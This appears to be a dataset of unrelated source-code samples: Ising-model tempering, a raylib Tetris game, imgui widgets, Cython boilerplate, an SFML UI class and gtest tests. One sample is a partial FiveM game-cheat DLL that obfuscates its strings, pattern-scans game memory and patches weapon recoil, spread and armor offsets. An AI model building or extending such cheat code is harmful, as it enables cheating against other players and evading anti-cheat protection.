(double)energies[j])*(1 /(double)temperatures[i] - 1 /(double)temperatures[j])));\n                    if (p < 0.2)\n                    {\n                        temperatures[i] = temperatures[j];\n                        energies[i] = energies[j];\n                        break;\n                    }\n\n                    if (j == NUM_OF_COPIES - 1)\n                    {\n                        for (int k = 0; k < tn_steps; k++)\n                        { \n                            double p = std::pow(2.718282, (((double)energies[i] - (double)energies[j])*(1 /(double)temperatures[i]-1/(double)temperatures[j])));\n                            if (p < 0.2)\n                            {   \n                                temperatures[i] -= alpha;\n                                energies[i] = approx(temperatures[j], temperatures[i], energies[j], energies[i], (-1)*alpha);\n                            }\n                            if (p > 0.2)\n                            {\n                                temperatures[i] += alpha;\n                                energies[i] = approx(temperatures[j], temperatures[i], energies[j], energies[i], alpha);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        \n        return temperatures;\n    };\n\n    double energy_mean(std::vector<double> e_arr, int REPEAT)\n    {   \n        double e_sum = 0;\n        for (int i = 0; i < REPEAT; i++) e_sum += e_arr[i];\n\n        return e_sum/(double)REPEAT;\n    };\n\n    int energy_metropolis(std::vector<int> state)\n    {\n        std::vector<std::vector<int>> energy_array(SIZE, std::vector<int>(SIZE));\n\n        for (int i = 0; i < SIZE; ++i)\n        {\n            for (int j = 0; j < SIZE; ++j)\n            {\n                if (i + 1 == SIZE && j + 1 == SIZE)\n                    energy_array[i][j] = (-1) * state[i * SIZE + j] * (state[i * SIZE] + state[j]);\n                else if (j + 1 == SIZE)\n                    energy_array[i][j] = (-1) * state[i * SIZE + j] * (state[i * SIZE] + state[(i + 1) * SIZE + j]);\n                else if (i + 1 == SIZE)\n                    energy_array[i][j] = (-1) * state[i * SIZE + j] * (state[i * SIZE + (j + 1)] + state[j]);\n                else\n                    energy_array[i][j] = (-1) * state[i * SIZE + j] * (state[i * SIZE + (j + 1)] + state[(i + 1) * SIZE + j]);\n            }\n        }\n\n        int sum = 0;\n\n        for (int i = 0; i < SIZE * SIZE; ++i)\n            sum += energy_array[i / SIZE][i % SIZE];\n\n        return sum;\n    };\n\n\n    _TEMPERING_CONTAIN",
    "//\n// ooooooooooooo               .             o8o           \n// 8'   888   `8             .o8             `\"'           \n//      888       .ooooo.  .o888oo oooo d8b oooo   .oooo.o \n//      888      d88' `88b   888   `888\"\"8P `888  d88(  \"8 \n//      888      888ooo888   888    888      888  `\"Y88b.  \n//      888      888    .o   888 .  888      888  o.  )88b \n//     o888o     `Y8bod8P'   \"888\" d888b    o888o 8\"\"888P' \n//\n// Version del template para el Juego TETRIS en estilo RETRO con libreria RAYLIB ---------\n// Date 2024\n// Desarrollo de Natxo Varona\n//\n// Nota: Lista de los bloques del indice del taller de juegos retros\n// 1. Setup The Game Loop -> OK\n// 2. Creating the Grid -> OK\n// 3. Create the blocks -> OK\n// 4. Move de Blocks -> OK\n//\n#include <iostream>\n#include <raylib.h>\n#include \"game.h\"\n\n// Definicion de variables y constantes para el juego -----------------\nColor Green = Color{38, 185, 154, 255};\nColor Dark_Green = Color{20, 160, 133, 255};\nColor Light_Green = Color{129, 204, 184, 255};\nColor Yellow = Color{243, 213, 91, 255};\nColor Grey = Color{29, 29, 29, 255};\nColor darkBlue = {44, 44, 127, 255};\n\nint main() {\n    // Comenzamos el programa ------------------------------------------\n    std::cout << std::endl;\n    std::cout << \"Starting the game ...\" << std::endl;\n    std::cout << std::endl;\n\n    const int screen_width = 300;\n    const int screen_height = 600;\n    int FPS = 12;\n    int Cell_Size = 25;\n\n    InitWindow(screen_width, screen_height, \"Mi Retro - Game of Tetris!\");\n    SetTargetFPS(FPS); \n\n    // Iniciamos la clase Game que ira creando el restos de clases para inciar el juego\n    Game game = Game();\n\n    //Grid grid = Grid();\n    //grid.Print();\n    //LBlock block = LBlock();\n    //block.Move(8, 5);\n\n    // Loop del juego de simulacion -------------------------------------\n  while (WindowShouldClose() == false) {\n  \n    // 1. Event Handing\n    game.HandleInput();\n    // 2. Updating State\n    // 3. Drawing Objects\n    BeginDrawing();\n    ClearBackground(darkBlue);\n    game.Draw();\n    EndDrawing();\n  }\n\n  CloseWindow();\n  return 0;\n}\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "// dear imgui, v1.85 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n#include \"imgui_internal.h\"\n\n// System includes\n#include <ctype.h>      // toupper\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>     // intptr_t\n#else\n#include <stdint.h>     // intptr_t\n#endif\n#include <map>\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"                // warning: format not a string literal, ",
    "/* Generated by Cython 0.29.37 */\n\n#ifndef PY_SSIZE_T_CLEAN\n#define PY_SSIZE_T_CLEAN\n#endif /* PY_SSIZE_T_CLEAN */\n#include \"Python.h\"\n#ifndef Py_PYTHON_H\n    #error Python headers needed to compile C extensions, please install development version of Python.\n#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)\n    #error Cython requires Python 2.6+ or Python 3.3+.\n#else\n#define CYTHON_ABI \"0_29_37\"\n#define CYTHON_HEX_VERSION 0x001D25F0\n#define CYTHON_FUTURE_DIVISION 0\n#include <stddef.h>\n#ifndef offsetof\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\n#endif\n#if !defined(WIN32) && !defined(MS_WINDOWS)\n  #ifndef __stdcall\n    #define __stdcall\n  #endif\n  #ifndef __cdecl\n    #define __cdecl\n  #endif\n  #ifndef __fastcall\n    #define __fastcall\n  #endif\n#endif\n#ifndef DL_IMPORT\n  #define DL_IMPORT(t) t\n#endif\n#ifndef DL_EXPORT\n  #define DL_EXPORT(t) t\n#endif\n#define __PYX_COMMA ,\n#ifndef HAVE_LONG_LONG\n  #if PY_VERSION_HEX >= 0x02070000\n    #define HAVE_LONG_LONG\n  #endif\n#endif\n#ifndef PY_LONG_LONG\n  #define PY_LONG_LONG LONG_LONG\n#endif\n#ifndef Py_HUGE_VAL\n  #define Py_HUGE_VAL HUGE_VAL\n#endif\n#ifdef PYPY_VERSION\n  #define CYTHON_COMPILING_IN_PYPY 1\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #if PY_VERSION_HEX < 0x03050000\n    #undef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 0\n  #elif !defined(CYTHON_USE_ASYNC_SLOTS)\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #if PY_VERSION_HEX < 0x03090000\n    #undef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1 && PYPY_VERSION_NUM >= 0x07030C00)\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PYSTON_VERSION)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 1\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 0\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_ASYNC_SLOTS\n  #define CYTHON_USE_ASYNC_SLOTS 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n#elif defined(PY_NOGIL)\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_PYSTON 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_NOGIL 1\n  #ifndef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #ifndef CYTHON_USE_ASYNC_SLOTS\n    #define CYTHON_USE_ASYNC_SLOTS 1\n  #endif\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #undef CYTHON_USE_UNICODE_WR",
    "#include \"UserInterface.h\"\n\n\ngui::UserInterface::UserInterface(const uint32_t maxWidgets)\n    : eventInfo(), active(false), currentIndex(0u), keyNames({\n        {sf::Keyboard::A, \"A\"},     {sf::Keyboard::B, \"B\"}, {sf::Keyboard::C, \"C\"},\n        {sf::Keyboard::D, \"D\"},     {sf::Keyboard::E, \"E\"}, {sf::Keyboard::F, \"F\"},\n        {sf::Keyboard::G, \"G\"},     {sf::Keyboard::H, \"H\"}, {sf::Keyboard::I, \"I\"},\n        {sf::Keyboard::J, \"J\"},     {sf::Keyboard::K, \"K\"}, {sf::Keyboard::L, \"L\"},\n        {sf::Keyboard::M, \"M\"},     {sf::Keyboard::N, \"N\"}, {sf::Keyboard::O, \"O\"},\n        {sf::Keyboard::P, \"P\"},     {sf::Keyboard::Q, \"Q\"}, {sf::Keyboard::R, \"R\"},\n        {sf::Keyboard::S, \"S\"},     {sf::Keyboard::T, \"T\"}, {sf::Keyboard::U, \"U\"},\n        {sf::Keyboard::V, \"V\"},     {sf::Keyboard::W, \"W\"}, {sf::Keyboard::X, \"X\"},\n        {sf::Keyboard::Y, \"Y\"},     {sf::Keyboard::Z, \"Z\"},\n\n        {sf::Keyboard::Num0, \"0\"},  {sf::Keyboard::Num1, \"1\"}, {sf::Keyboard::Num2, \"2\"},\n        {sf::Keyboard::Num3, \"3\"},  {sf::Keyboard::Num4, \"4\"}, {sf::Keyboard::Num5, \"5\"},\n        {sf::Keyboard::Num6, \"6\"},  {sf::Keyboard::Num7, \"7\"}, {sf::Keyboard::Num8, \"8\"},\n        {sf::Keyboard::Num9, \"9\"},\n\n        {sf::Keyboard::Space, \"Space\"},         {sf::Keyboard::LControl, \"Left Ctrl\"},\n        {sf::Keyboard::LShift, \"Left Shift\"},   {sf::Keyboard::RControl, \"Right Ctrl\"},\n        {sf::Keyboard::RShift, \"Right Shift\"},  {sf::Keyboard::Tab, \"Tab\"},\n        {sf::Keyboard::Escape, \"Esc\"},          {sf::Keyboard::Enter, \"Enter\"}\n        })\n{\n    this->widgets.reserve(maxWidgets);\n    clock.restart();\n}\n\nvoid gui::UserInterface::addWidget(std::unique_ptr<Widget> element)\n{\n    widgets.push_back(std::move(element));\n}\n\nvoid gui::UserInterface::update()\n{\n    if (sf::Mouse::isButtonPressed(sf::Mouse::Left) && clock.getElapsedTime().asSeconds() >= 0.2f)\n    {\n        eventInfo.mousePressed = !eventInfo.mousePressed;\n        clock.restart();\n    }\n\n    for (unsigned int index = 0; index < widgets.size(); index++)\n    {\n        Widget* widget = widgets[index].get();\n\n        if (widget->update(eventInfo))\n        {\n            active = true;\n            currentIndex = index;\n            break;\n        }\n    }\n}\n\nvoid gui::UserInterface::render(sf::RenderTarget& target)\n{ \n    eventInfo.mousePosition = target.mapPixelToCoords(sf::Mouse::getPosition());\n    \n    for (const auto& widget : widgets)\n    {\n        widget->render(target);\n    }\n}\n\nvoid gui::UserInterface::handleEvent(sf::Event& event)\n{\n    if (!active)\n    {\n        return;\n    }\n\n    const auto it = keyNames.find(event.key.code);\n\n    switch (event.type)\n    {\n    case sf::Event::KeyPressed:\n        eventInfo.key = event.key.code;\n\n        if (it != keyNames.end())\n        {\n            eventInfo.textInput = it->second;\n            eventInfo.keyPressed = true;\n            active = false;\n        }\n        else\n        {\n            eventInfo.textInput = nullptr;\n        }\n        break;\n\n\n    default:\n        break;\n    }\n}\n\nconst sf::Keyboard::Key gui::UserInterface::getKey() const\n{\n    return eventInfo.key;\n}\n\nconst char* gui::UserInterface::sfKeyToChar(sf::Keyboard::Key key)\n{\n    const auto it = keyNames.find(key);\n    std::cout << it->second << \"\\n\";\n    return it->second;\n}\n\n\n\n",
    "#include \"clopts.hpp\"\n#include <gtest/gtest.h>\n#include <sstream>\n#include <regex>\n#include <initializer_list>\n\nnamespace{\n\nusing namespace moss;\n\n/** Test for options, which terminate the interpreter (-h/-version) */\nTEST(CmdOptions, Terminating){\n    // help\n    const char* argv[] = {\n        \"moss\", \"-h\"\n    };\n    int argc = sizeof(argv) / sizeof(argv[0]);\n\n    EXPECT_EXIT(clopts::parse_clopts(argc, argv), ::testing::ExitedWithCode(0), \"\");\n    \n    // version\n    const char* argv2[] = {\n        \"moss\", \"--version\"\n    };\n    int argc2 = sizeof(argv2) / sizeof(argv2[0]);\n\n    EXPECT_EXIT(clopts::parse_clopts(argc2, argv2), ::testing::ExitedWithCode(0), \"\");\n\n    // file followed by program argument\n    const char* argv3[] = {\n        \"moss\", \"--nonexistentflag42\", \"and one more\"\n    };\n    int argc3 = sizeof(argv3) / sizeof(argv3[0]);\n\n    // Test that we dont exit with other code that 0, force 0 after no exit\n    EXPECT_EXIT(clopts::parse_clopts(argc3, argv3), testing::ExitedWithCode(1), \".*Flag could not be matched.*\");\n}\n\n/** Correct command line options, that should not terminate the program */\nTEST(CmdOptions, NonTerminating) {\n    // file followed by program argument\n    const char* argv[] = {\n        \"moss\", \"program.ms\", \"--nonexistentflag42\", \"and one more\"\n    };\n    int argc = sizeof(argv) / sizeof(argv[0]);\n\n    // Test that we dont exit with other code that 0, force 0 after no exit\n    ASSERT_EXIT( { clopts::parse_clopts(argc, argv); exit(0); },\n            testing::ExitedWithCode(0),\n            \"\");\n\n    clopts::parse_clopts(argc, argv);\n    EXPECT_TRUE(args::get(clopts::file_name) == std::string(\"program.ms\"));\n    EXPECT_FALSE(clopts::code);\n\n    // code string followed by program argument\n    const char* argv1[] = {\n        \"moss\", \"-e\", \"print(\\\"hi\\\");\", \"--nonexistentflag42\", \"and one more\"\n    };\n    int argc1 = sizeof(argv1) / sizeof(argv1[0]);\n\n    // Test that we dont exit with other code that 0, force 0 after no exit\n    EXPECT_EXIT( { clopts::parse_clopts(argc1, argv1); exit(0); },\n            